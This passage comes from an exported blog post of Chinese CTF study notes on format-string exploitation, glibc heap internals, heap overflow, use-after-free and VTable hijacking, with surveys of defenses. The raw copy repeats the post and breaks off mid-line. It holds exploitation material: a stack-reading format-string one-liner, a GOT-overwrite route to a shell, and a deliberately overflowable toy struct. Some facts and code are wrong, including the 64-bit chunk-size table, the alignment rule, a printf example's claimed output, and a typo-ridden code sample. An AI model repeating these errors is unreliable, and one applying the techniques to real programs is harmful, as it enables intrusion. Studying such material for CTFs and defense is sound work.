若前一个chunk是free状态（并且不在fastbin）则置0\n\n- is_mmaped \n\n- - 是否是通过mmap()产生的\n\n- non_main_arena\n\n**Glibc:被释放的chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204722491.png\" alt=\"image-20210625204722491\" style=\"zoom:50%;\" />\n\n- 下一个chunk的prev_size 这个free chunk的长度\n- 下一个chunk的prev_in_use 为0\n- 但是 如果这个被释放的chunk在fastbin，这些东西就不会被设置\n- 这个 chunk 是否属于一个线程的     arena\n\n**堆溢出**\n\n- 基本上与栈溢出基本类似\n\n- 栈溢出的目标 \n\n- - 返回地址\n  - 保存在栈帧的指针\n  - 局部函数变量\n  - 异常句柄\n  - 其他敏感数据\n\n- 堆溢出的目标 \n\n- - 堆的元数据\n  - 对象中的函数指针\n  - 对象中的vtable指针\n  - 其他敏感数据\n\n**例子**\n\n```c++\n\tstruct toystr()\n{\n    void (* message)(char *);\n    char buffer[20];\n}\n\tcoolguy = malloc(sizeof(struct toystr))\n\tlameguy = malloc(sizeof(struct toystr))\n\tcoolguy -> message = &print_cool;\n\tlameguy -> message = &print_meh;\n\tputs(\"Input coolguy's name:\");\n\tfgets(coolguy->fuffer,200,stdin);\n\tcoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\n\tputs(\"Input lameguy's name:\");\n\tfgets(coolguy->fuffer,200,stdin);\n\tcoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\n\tcoolguy->message(coolguy->buffer);\n\tlameguy->message(lameguy->buffer);\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205042187.png\" alt=\"image-20210625205042187\" style=\"zoom:50%;\" />\n\n```c++\ncoolguy = malloc(sizeof(struct toystr))\nlameguy = malloc(sizeof(struct toystr))\ncoolguy -> message = &print_cool;\nlameguy -> message = &print_meh;\nputs(\"Input coolguy's name:\");\nfgets(coolguy->fuffer,200,stdin);\ncoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\nputs(\"Input lameguy's name:\");\nfgets(coolguy->fuffer,200,stdin);\ncoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\ncoolguy->message(coolguy->buffer);\nlameguy->message(lameguy->buffer);//<--------被溢出覆盖的函数指针\n```\n\n- 堆溢出有什么其他的利用方法？ \n\n- - 对象中的函数指针\n  - 管理堆的元数据\n  - VTable指针\n\n**溢出一个正在被使用的chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205135042.png\" alt=\"image-20210625205135042\" style=\"zoom:50%;\" />\n\n- 溢出 p bit（prev_in_use） \n\n- - 从0改变成1 \n\n  - - 当这个chunk被free，前一个chunk不会被合并\n    - note：只有被free的chunk比fast-bin-size大时才会发生合并操作\n\n  - 从1改变成0 \n\n  - - 当这个chunk被free时，前一个chunk会被合并\n    - Q1:前一个\"free\"状态chunk的大小？\n    - Q2:什么时候会发生合并？\n    - 如果合并的free       chunk接下来被分配给其他对象，那么两个不同的对象会共享同一段内存\n\n- 溢出 N bit（non_main_arena） \n\n- - 从0改变成1 \n\n  - - 会标志其为non_main_arena，切换arena\n    - 当这个chunk被释放，将会被添加到fastbin或者unsorted_bin\n    - 指向fastbin/unsorted_bin的指针会更新\n\n**溢出一个free chunk**\n\n- 溢出 P bit     （prev_in_use） \n\n- - 从1改变成0 \n\n  - - Q1：如果被分配给对象，P bit会被堆管理器纠正吗？\n    - Q2:如果这个chunk被其他free chunk合并了呢？\n      e.g.：该free chunk之后的chunk被释放，其会尝试向前面的chunk合并，得到一个非预期大小的free chunk\n    - 这个free       chunk可以在稍后分配新的对象，新的对象会和前面的chunk共享内存\n    - Q3:如果这个chunk在bins之间移动？\n\n  - 从0改变成1，前面的free      chunk将不会被合并\n\n  - 被释放的堆快由arena/fastbin追踪记录\n\n  - 被释放的堆快可以在稍后分配给新的对象，或者被新的free chunk合并，或者按照 fastbin->unsorted_bin->smallbin/largebin的顺序移动\t\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205424699.png\" alt=\"image-20210625205424699\" style=\"zoom:50%;\" />\n\n- 溢出 size 区域 \n\n- - 如果该chunk被分配？\n  - 如果该chunk被物理相邻的chunk合并？\n  - 如果这个chunk在bins间移动？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205445914.png\" alt=\"image-20210625205445914\" style=\"zoom:50%;\" />\n\n- 溢出 fd/bk指针 \n\n- - 产生 unlink 问题\n\n- 溢出 prev_size 区域 \n\n- - 如果缩小prev_size \n\n  - - 当下一个chunk被释放时，会发生什么？       \n\n    - - 会尝试合并当前chunk（的一部分）\n      - 当前chunk（的一部分）将被unlink，导致unlink操作到假的fd/bk指针，并且当前        free chunk和合并的chunk重叠。\n\n  - 如果放大prev_size \n\n  - - 当下一个chunk被释放时，会发生什么？       \n\n    - - 会尝试合并当前chunk（大于实际）\n      - （大于实际）的当前堆快将被unlink，导致unlink操作到假的fd/bk指针，并且前面（正在使用）的chunk会和新合并的free        chunk共享内存\n\n**溢出TOP chunk的size区域**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205532518.png\" alt=\"image-20210625205532518\" style=\"zoom:50%;\" />\n\n- 缩小size \n\n- - 浪费内存\n\n- 放大size \n\n- - 新的分配请求总是能被TOP      chunk满足\n  - 这个（比实际大的）TOP      chunk可以覆盖包括 code/data,e.g.,got表，那么任意地址都可以被分配请求返回\n\n**防御堆溢出**\n\n- cookie \n\n- - 与StackGuard/GS（在返回地址附近插入cookie）类似，我们可以在堆对象附近插入cookie。\n\n- 但是 \n\n- - 运行时开销非常大\n\n  - 没有一个好的时间节点进行cookie检查：      \n\n  - - 对于栈，在函数返回时进行检查\n    - 对于堆，一个还算合理的适当malloc/free被调用时进行检查，但其可能无法对被损害的对象进行操作。\n\n**Use-After-Free (UAF)**\n\n- 漏洞 \n\n- - 被释放的内存被再次释放？\n  - 被释放的内存被损坏？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205716558.png\" alt=\"image-20210625205716558\" style=\"zoom:50%;\" />\n\n- 攻击\n  - 最常见的UAF攻击：VTable Hijacking\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205758688.png\" alt=\"image-20210625205758688\" style=\"zoom:50%;\" />\n\n**UAF vulnerability(MS12-063)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205915719.png\" alt=\"image-20210625205915719\" style=\"zoom:50%;\" />\n\n**UAF vulnerability(MS12-063)**<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205933444.png\" style=\"zoom:50%;\" />\n\n**动态分配的VTable(c++)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205958106.png\" alt=\"image-20210625205958106\" style=\"zoom:50%;\" />\n\n```c++\nvoid foo(Base2* obj){\n    obj->vg4();\n}\nvoid main(){\n    Base2* obj = new Sub();\n    foo(obj);\n}\n```\n\n```assembly\ncode section\n; Function main()\npush SIZE\ncall malloc()\nmov ecx, eax\ncall Sub::Sub()\n; now ECX points to the Sub object\nadd ecx, 8\n; now ECX points to the Sub::Base2 object\ncall foo()\nret\n; Function foo()\nmov eax, [ecx]      ; read vfptr of Base2\nmov edx, [eax+0x0C] ; get vg4() from vtable\ncall edx            ; call Base2::vg4()\nret\n```\n\n**VTable Hijacking 分类**\n\n- 损坏VTable \n\n- - 覆盖VTable\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210119072.png\" alt=\"image-20210625210119072\" style=\"zoom:50%;\" />\n\n- VTable注入 \n\n- - 覆盖vfptr\n  - 指向假的VTable\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210150396.png\" alt=\"image-20210625210150396\" style=\"zoom:50%;\" />\n\n- VTable重用 \n\n- - 覆盖vfptr\n  - 指向包括VTable，数据等\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210205114.png\" alt=\"image-20210625210205114\" style=\"zoom:50%;\" />\n\n**VTable Hijacking 实战**\n\n- Pwn2Own 2014  firefox\n- Pwn2Own 2014  chrome\n- CVE-2014-1772   IE\n\n```assembly\ncode section\n; Function main()\npush SIZE\ncall malloc()\nmov ecx, eax\ncall Sub::Sub()\n; now ECX points to the Sub object\nadd ecx, 8\n; now ECX points to the Sub::Base2 object\ncall foo()\nret\n; Function foo()\nmov eax, [ecx]      ; read vfptr of Base2\nmov edx, [eax+0x0C] ; get vg4() from vtable\ncall edx            ; call Base2::vg4()\nret\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210304071.png\" alt=\"image-20210625210304071\" style=\"zoom:50%;\" />\n\n**防御VTable Hijacking**\n\n**VTint**\n\n| **-**        | **Attack**                      | **Requirement**              |\n| ------------ | ------------------------------- | ---------------------------- |\n| VTable  破坏 | 覆盖  VTable                    | VTable可写                   |\n| VTable  注入 | 覆盖vfptr，指向被注入的VTable   | VTable可写                   |\n| VTable  重用 | 覆盖vfptr，指向包括VTable，数据 | 形似VTable的数据，包括VTable |\n\n| **-**        | **Attack**                      | **Requirement**              | **解决方案**      |\n| ------------ | ------------------------------- | ---------------------------- | ----------------- |\n| VTable  破坏 | 覆盖  VTable                    | VTable可写                   | VTable只读        |\n| VTable  注入 | 覆盖vfptr，指向被注入的VTable   | VTable可写                   | VTable只读        |\n| VTable  重用 | 覆盖vfptr，指向包括VTable，数据 | 形似VTable的数据，包括VTable | 不同的VTable/数据 |\n\n**VTint vs. DEP**\n\n| **-**        | **VTint**         |\n| ------------ | ----------------- |\n| VTable  破坏 | VTable只读        |\n| VTable  注入 | VTable只读        |\n| VTable  重用 | 不同的VTable/数据 |\n\n| **-**        | **DEP**                          |\n| ------------ | -------------------------------- |\n| VTable  破坏 | 只读的代码段                     |\n| VTable  注入 | 只读的代码段(可写的段不会被执行) |\n| VTable  重用 | NO                               |\n\n- 与DEP的相同之处 \n\n- - 轻量级，可以是二进制可兼容的。\n\n- 不同 \n\n- - 加固后，可攻击面更小\n\n**二进制级防护：vfGuard**\n\nNDSS’15: Dynamic binary instrumentation\n\n\\- 在运行时检查虚拟调用指令（使用PIN）\n\n\\- 针对指令使用不同策略\n\n- 优势 \n\n- - 易于扩展，去执行不同策略\n\n- 劣势 \n\n- - 开销大（PIN的开销*118%）\n  - 无法防御VTables重用攻击\n\n**源代码级防护：vfGuard**\n\n- Microsoft IE10,     Core Objects \n\n- - 在VTable结束地方的特殊cookies\n\n- 优势 \n\n- - 轻量级\n\n- 劣势 \n\n- - 只防御核心对象Core      Objects\n  - 不能应付VTable注入\n  - 信息泄漏\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210454607.png\" alt=\"image-20210625210454607\" style=\"zoom:50%;\" />\n\n**源代码级防护：SafeDispatch**\n\n- NDSS’14, LLVM-based     \n\n- - 静态计算一系列合法目标\n  - 根据计算结果进行动态验证\n\n- 策略1: VTable Check \n\n- - 劣势： \n\n  - - 编译阶段需要耗费大量时间去分析\n    - 高运行时开销（~30%）\n\n- 策略2: moethod Check \n\n- - 劣势： \n\n  - - 编译阶段需要耗费大量时间去分析\n    - 高运行时开销（~7%）\n\n**源代码级防护：Forward Edge CFI**\n\n- GCC-VTV     [Usenix’14], whitelist-based\n\n  \\- 在编译阶段计算一组不完整的合法目标\n  \\- 在加载是通过初始化函数合并不完整的数据\n  \\- 在运行时检验是否合法\n\n- 优势 \n\n- - 支持增量构建\n\n- 劣势 \n\n- - 运行时操作繁琐\n\n**源代码级别的防护：RockJIT**\n\n- CCS’15, CFI-based \n\n- - 在编译阶段收集类型信息\n  - 根据收集到的信息计算加载时转移目标的等价类别\n  - 更新CFI检查，在加载时只允许间接传输到一个等价类\n\n- 优势 \n\n- - 支持增量构造\n\n- 劣势 \n\n- - 加载时开销大\n\n头疼≧ ﹏ ≦~~~\n","source":"_posts/ctfpwn2.md","raw":"```\n 学习日记2\n```\n\n**格式化字符串**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625195611418.png\" alt=\"image-20210625195611418\" style=\"zoom:60%;\" />\n\n**格式化占位符**\n\n格式化字符串中的占位符用于指明输出的参数值如何格式化。\n\n| **字符** | **描述**                                                     |\n| -------- | ------------------------------------------------------------ |\n| n$       | n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。  如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO  C。例：printf(\"%2$d %2$#x; %1$d %1$#x\",16,17) 产生\"17 0x11; 16  0x10\" |\n\n Flags可为0个或多个：\n\n| **字 符** | **描述**                                                     |\n| --------- | :----------------------------------------------------------- |\n| +         | 总是表示有符号数值的'+'或'-'号，缺省情况是忽略正数的符号。仅适用于数值类型。 |\n| 空格      | 使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与'+'同时出现，则空格说明符被忽略。 |\n| -         | 左对齐。缺省情况是右对齐。                                   |\n| #         | 对于'g'与'G'，不删除尾部0以表示精度。对于'f',  'F', 'e', 'E', 'g', 'G', 总是输出小数点。对于'o', 'x', 'X', 在非0数值前分别输出前缀0, 0x, and  0X表示数制。 |\n| 0         | 如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(\"%2d\",  3)输出\" 3\"，printf(\"%02d\",  3)输出\"03\"。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。 |\n\n**格式化占位符**\n\nLength指出浮点型参数或整型参数的长度。可以忽略，或者是下述：\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200440768.png\" alt=\"image-20210625200440768\" style=\"zoom:50%;\" />\n\n**漏洞利用**\n\n- 读取数据 \n\n- - %x\n  - %d\n  - %s\n\n- 写入数据 \n\n- - %n\n\n**读取数据**\n\n**$操作符**\n\n读取一个特定的参数\n\nprintf(\"%3$s\", 1, \"b\", \"c\", 4);\n\n将显示3而不是对应顺序的1。其他例子：\n\n- printf(\"%3$d\",1,2,3);，显示3\n- printf(\"%3$d     %2$d %1$d\",1,2,3);，显示3 2 1\n\n读取栈上第100个dword数据\n\n$ python -c \"print '%100$08x'\" | ./print2\n ffa3cad0\n\n通过$操作符读取任意地址数据！！！\n\n**写入数据**\n\n- 任意地址任意写\n\n- - 任意地址：$控制\n  - 任意值：      %xd通过控制x改变输出的字符个数\n\n- getshell\n\n- - 任意地址任意写------>getshell?\n\n- - 覆盖got表！！！\n\n**AAR和AAW**\n\n- AAR：任意地址读（arbitrary     address read）\n- AAW：任意地址写（arbitrary     address write）\n- 能做到这两点就非常强了，重点是如何拿到shell\n- Q：写哪些地址，写什么值进去，可以劫持控制流？\n- A：GOT表\n\n**GOT表**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200629787.png\" alt=\"image-20210625200629787\" style=\"zoom:50%;\" />\n\n**防御**\n\n- 调用约定 \n\n- - caller将所有参数放在栈上\n  - callee假设所有参数都在栈上\n\n- 漏洞确实存在，假设caller传的参数和callee期望的参数个数不同\n\n- 解决方案：在caller和callee之间做验证     \n\n- - caller一共传了多少参数？ \n\n  - - 编译器在编译阶段可以知道\n\n  - callee使用了多少参数？ \n\n  - - 仅在运行时方可知道\n\n### **Glibc堆分配机制**\n\n**堆的使用**\n\n| **分类**   | **函数**                                              |\n| ---------- | ----------------------------------------------------- |\n| 程序员应用 |                                                       |\n| libc 函数  | malloc(),  realloc(), free(), brk(), mmap(), munmap() |\n| 内核调用   | brk,  mmap, munmap                                    |\n\n**Linux 进程布局**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200833180.png\" alt=\"image-20210625200833180\" style=\"zoom:50%;\" />\n\n没错！又是它o(*￣▽￣*)ブ！！！\n\n**堆 VS 栈**\n\n- 堆 \n  - 动态分配 \n  - 对象，大缓冲区，结构体... \n\n- 更慢，手动 \n\n- - malloc / calloc /      recalloc / free\n  - new / delete\n\n- 栈\n\n- - 在编译阶段就固定的内存分配\n  - 局部变量，返回地址，函数地址\n\n- 快，自动\n\n- - 编译阶段就完成\n  - 抽象出分配/取消分配的概念\n\n**堆的实现**\n\n不同的堆实现\n\n- dlmalloc\n- ptmalloc (glibc)\n- tcmalloc (Chrome,     replaced)\n- jemalloc     (Firefox/Facebook)\n- nedmalloc\n- Hoard\n\n**glibc的堆实现**\n\nchunk\n 堆的基本单位是一个一个chunk块，chunk的结构如下：\n\n```c++\nstruct malloc_chunk {\n    INTERNAL_SIZE_T    prev_size;     /* Size of previous chunk (if free).  */\n    INTERNAL_SIZE_T    size;          /* Size in bytes, including overhead. */\n    struct malloc_chunk* fd;          /* double links -- used only if free. */\n    struct malloc_chunk* bk;                                                                           / * Only used for large blocks: pointer to next larger size.  */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n    struct malloc_chunk* bk_nextsize;\n };\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201205824.png\" alt=\"image-20210625201205824\" style=\"zoom:50%;\" />\n\n**chunk size**\n\n为了执行效率，chunk的长度会进行对齐\n\n- 32bit： （x + 4）对齐到8\n\n| **data size** | **0 ~ 4** | **5 ~ 12** | **13 ~ 20** | **...** | **53 ~ 60** | **61 ~ 68** | **69 ~ 76** | **77 ~ 84** |\n| ------------- | --------- | ---------- | ----------- | ------- | ----------- | ----------- | ----------- | ----------- |\n| chunk  size   | 16        | 16         | 24          | ...     | 64          | 72          | 80          | 88          |\n\n- 64bit： （x + 4）对齐到16\n\n| **data size** | **0 ~ 8** | **9 ~ 24** | **25 ~ 40** | **...** | **105 ~ 120** | **121 ~ 136** | **137 ~ 152** | **153 ~ 168** |\n| ------------- | --------- | ---------- | ----------- | ------- | ------------- | ------------- | ------------- | ------------- |\n| chunk  size   | 32        | 32         | 24          | ...     | 64            | 72            | 80            | 88            |\n\n**In used chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201332771.png\" alt=\"image-20210625201332771\" style=\"zoom:50%;\" />\n\n- 如果前面的chunk是使用状态，prev_size则属于前一个堆块。\n- prev_in_use表明前一个堆块是否free状态（且不在fastbins内）\n- is_mmaped说明内存来自于mmap()\n- non_main_arena表明该堆块由非主线程分配\n\n**free chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625202247694.png\" alt=\"image-20210625202247694\" style=\"zoom:50%;\" />\n\n如果前面的chunk是空闲状态，prev_size则记录前面chunk的大小。\n\n下一个堆块的prev_size记录本堆块的大小。\n\n其中，size不同于pre_size的是，size中的低三位作为flag。\n\n- 最低位:前一个 chunk         是否正在使用\n- 倒数第二位:当前 chunk     是否是通过 mmap 方式产生的\n- 倒数第三位:这个 chunk     是否属于一个线程的 arena\n  需要注意的是，如果该free chunk落在fastbin中，这些数据将不会被设置。\n\n**chunk**\n\n- 正在被使用的chunk \n\n- - 被程序的数据指针指向\n  - 长度是对于chunk本身是可知的\n  - free()因此得以工作\n\n- free状态的chunk \n\n- - 不再被程序指向\n  - 稍后会被重复使用来回应内存分配\n  - 需要有效的组织管理free  chunk以便于maclloc()来分配\n  - how？\n\n**free chunks的组织管理**\n\n- 链表，通常的，一个链表拥有的chunk长度相同     \n\n- - 需要多个链表\n  - 以管理不同长度的chunk\n  - 单链表或双向链表\n  - 链表被分组为几个BINs\n  - fastbins,unsorted_bin,smallbins,largebins\n\n**Arena(32bit)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203040407.png\" alt=\"image-20210625203040407\" style=\"zoom:50%;\" />\n\n**Get Arena**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203114779.png\" alt=\"image-20210625203114779\" style=\"zoom:50%;\" />\n\n**fastbin**\n\n管理16bytes-64bytes（64位下为32bytes~128bytes）的chunk的单向链表数据结构，由于需要加速程序执行速度的原因，linux对于fastbin的检查较为松散，因此利用起来也较为方便。\n\n- 单向链表 \n\n- - 特点：快\n  - 释放后的chunk插入fastbin表头\n  - 只使用fd指针，bk指针，pre_size,p bit无效\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203309172.png\" alt=\"image-20210625203309172\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203322743.png\" alt=\"image-20210625203322743\" style=\"zoom:40%;\" />\n\n**unsorted_bin**\n\n- malloc() \n\n- - 如果搜索到unsorted_bin，对它管理的chunk一一处理      \n\n  - - 把chunk归放到small/large  bin（唯一增加small/large bin的地方）\n    - 如果长度刚好满足要求，就返回chunk并结束搜索\n\n- free() \n\n- - 如果free的chunk不能放到fastbin，就放到unsorted_bin。\n\n  - 向前面的空闲的chunk合并 \n\n  - - 通过检查p bit\n\n  - 向后面的空闲的chunk合并 \n\n  - - 通过检查它后一个chunk p       bit\n\n  - 设置fd，bk指针，后一个chunk的prev_size,p  bit\n\n**Small-bins**\n\nsmall-bins特点：\n\n- malloc() \n\n- - 如果找到对应长度的chunk，则直接返回\n\n- free() \n\n- - 不会直接把chunk放进small-bin\n\n- fd/bk被设置 \n\n- - 当chunk从unsorted_bin删除时。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203558989.png\" alt=\"image-20210625203558989\" style=\"zoom:50%;\" />\n\n**Large-bins**\n\n- malloc() \n\n- - 如果large-bin被搜索到 \n\n  - - 寻找满足要求的最小chunk\n    - 或者分裂大chunk，一份返回给用户，一份加入到unsorted_bin\n\n- free() \n\n- - 不会直接放到large-bin\n\n- fd/bk, fd_nextsize/bk_nextsize 被设置 \n\n- - 当其从unsorted_bin删除时。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203631401.png\" alt=\"image-20210625203631401\" style=\"zoom:50%;\" />\n\n**top chunk**\n\n初次malloc()后，没有被分出去的堆。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203756685.png\" alt=\"image-20210625203756685\" style=\"zoom:50%;\" />\n\n**malloc过程**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203823867.png\" alt=\"image-20210625203823867\" style=\"zoom:50%;\" />\n\n- 检查长度是否符合fastbin的范围，如果在其中找到，则     \n\n- - 将其从单链表删除\n  - 更新fd指针\n\n- 检查长度是否符合smallbins的范围，如果在其中找到，则     \n\n- - 从双向链表中删除\n  - 更新fd/bk指针\n\n- 如果尝试分配长度很大的chunk，不直接搜索large-bin，而是进行chunk整理     \n\n- - 把fastbin放到unsorted_bin中\n  - 更新下一个chunk的prev_size和p      bit\n  - 合并空闲堆快\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203848532.png\" alt=\"image-20210625203848532\" style=\"zoom:50%;\" />\n\n- 在unsorted_bin中搜索 \n\n- - 如果last_reminder      cache足够大，就分一块出来\n  - 如果找到合适大小的chunk就返回\n  - 对于搜索的每个chunk，将其按照范围放进small/large      bins\n\n- 更新fd/bk指针\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203902464.png\" alt=\"image-20210625203902464\" style=\"zoom:50%;\" />\n\n- 在small/large中搜索 \n\n- - 在最小的非空small/large      bin中找到足够大的chunk \n\n  - - unlink，split\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203923167.png\" alt=\"image-20210625203923167\" style=\"zoom:50%;\" />\n\n- 从TOP chunk中获取内存 \n\n- - 如果top      chunk足够大，就分一部分出来\n  - 如果没有fastbin就从系统获取内存\n  - 再次整理fastbin和unsorted_bin\n\n**free**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203941475.png\" alt=\"image-20210625203941475\" style=\"zoom:50%;\" />\n\n- 检查元数据的安全性 \n\n- - e.g. :      ptr->fd->bk == ptr\n\n- 如果大小在fastbin范围内就放到fastbin里面     \n\n- - 更新fastbin，fd\n\n- 合并前一个free状态的chunk \n\n- - unlink\n\n- 合并后一个free状态的chunk \n\n- - unlink，top\n\n**unlink**\n\n- 从链表中删除结点，并更新BK/FD\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204020527.png\" alt=\"image-20210625204020527\" style=\"zoom:50%;\" />\n\n\\#define unlink(p,BK,FD)\n {\n   FD = p -> fd;\n   BK = p -> bk;\n   FD -> bk = BK;\n   BK -> fd = FD;\n }\n\n**什么时候进行unlink**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204048786.png\" alt=\"image-20210625204048786\" style=\"zoom:50%;\" />\n\n- free chunk从双向链表中被取出     \n\n- - 一种情况：与它物理相邻的堆块合并\n  - 另一种情况：回应系统的分配请求\n\n- 如果空闲堆块被损害？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204119490.png\" alt=\"image-20210625204119490\" style=\"zoom:50%;\" />\n\n**当chunk被unlink时**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204132422.png\" alt=\"image-20210625204132422\" style=\"zoom:50%;\" />\n\n**main_areana 地址**\n\n- 运行时libc基地址\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204159171.png\" alt=\"image-20210625204159171\" style=\"zoom:50%;\" />\n\n编译时确定的main_arena的偏移\n\n![image-20210625204227122](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204227122.png)\n\n运行时main_arena的地址\n\n0xf7e16000 + 0x001BA420= 0xf7fd0420\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204302602.png\" alt=\"image-20210625204302602\" style=\"zoom:50%;\" />\n\n**main_arena内容**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204321373.png\" alt=\"image-20210625204321373\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204358309.png\" alt=\"image-20210625204358309\" style=\"zoom:50%;\" />\n\n- free()和malloc()依赖于元数据(chunk的头部信息)来     \n\n- - 遍历      bins/lists/chunks\n  - 将内存返回给用户\n\n- 但是这些元数据没有很好的保护 \n\n- - 堆溢出，use-after-free\n\n**堆溢出利用**\n\n**Glibc：Chunk In Use**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204532029.png\" alt=\"image-20210625204532029\" style=\"zoom:50%;\" />\n\n- prev_size 区域 \n\n- - 属于前一个chunk\n  - 如果前一个chunk是free状态（并且不在fastbin）就会被设置\n\n- prev_in_use \n\n- - 若前一个chunk是free状态（并且不在fastbin）则置0\n\n- is_mmaped \n\n- - 是否是通过mmap()产生的\n\n- non_main_arena\n\n**Glibc:被释放的chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204722491.png\" alt=\"image-20210625204722491\" style=\"zoom:50%;\" />\n\n- 下一个chunk的prev_size 这个free chunk的长度\n- 下一个chunk的prev_in_use 为0\n- 但是 如果这个被释放的chunk在fastbin，这些东西就不会被设置\n- 这个 chunk 是否属于一个线程的     arena\n\n**堆溢出**\n\n- 基本上与栈溢出基本类似\n\n- 栈溢出的目标 \n\n- - 返回地址\n  - 保存在栈帧的指针\n  - 局部函数变量\n  - 异常句柄\n  - 其他敏感数据\n\n- 堆溢出的目标 \n\n- - 堆的元数据\n  - 对象中的函数指针\n  - 对象中的vtable指针\n  - 其他敏感数据\n\n**例子**\n\n```c++\n\tstruct toystr()\n{\n    void (* message)(char *);\n    char buffer[20];\n}\n\tcoolguy = malloc(sizeof(struct toystr))\n\tlameguy = malloc(sizeof(struct toystr))\n\tcoolguy -> message = &print_cool;\n\tlameguy -> message = &print_meh;\n\tputs(\"Input coolguy's name:\");\n\tfgets(coolguy->fuffer,200,stdin);\n\tcoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\n\tputs(\"Input lameguy's name:\");\n\tfgets(coolguy->fuffer,200,stdin);\n\tcoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\n\tcoolguy->message(coolguy->buffer);\n\tlameguy->message(lameguy->buffer);\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205042187.png\" alt=\"image-20210625205042187\" style=\"zoom:50%;\" />\n\n```c++\ncoolguy = malloc(sizeof(struct toystr))\nlameguy = malloc(sizeof(struct toystr))\ncoolguy -> message = &print_cool;\nlameguy -> message = &print_meh;\nputs(\"Input coolguy's 